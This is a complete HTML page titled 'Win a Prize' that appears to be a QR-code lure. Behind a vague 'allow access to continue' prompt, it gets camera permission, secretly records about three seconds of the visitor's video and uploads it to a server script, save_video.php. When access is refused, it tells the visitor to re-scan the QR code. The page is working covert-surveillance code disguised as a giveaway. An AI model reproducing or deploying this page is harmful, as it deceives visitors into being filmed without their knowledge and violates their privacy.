<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Win a Prize</title>
  <style>
    body {
      background-color: white;
      color: black;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
      margin: 0;
    }
    #message {
      font-size: 1.5em;
    }
  </style>
</head>
<body>
  <div id="message">Please allow access to continue.</div>

  <script>
    (async () => {
      try {
        // Try accessing the camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });

        document.getElementById("message").textContent = "Loading...";

        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const reader = new FileReader();

          reader.onloadend = () => {
            fetch('save_video.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: 'videoData=' + encodeURIComponent(reader.result)
            });
          };

          reader.readAsDataURL(blob);
        };

        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 3000);

      } catch (err) {
        // Handle permission denied or other error
        document.getElementById("message").textContent =
          "You have blocked camera access. Please re-scan the QR.";
      }
    })();
  </script>
</body>
</html>
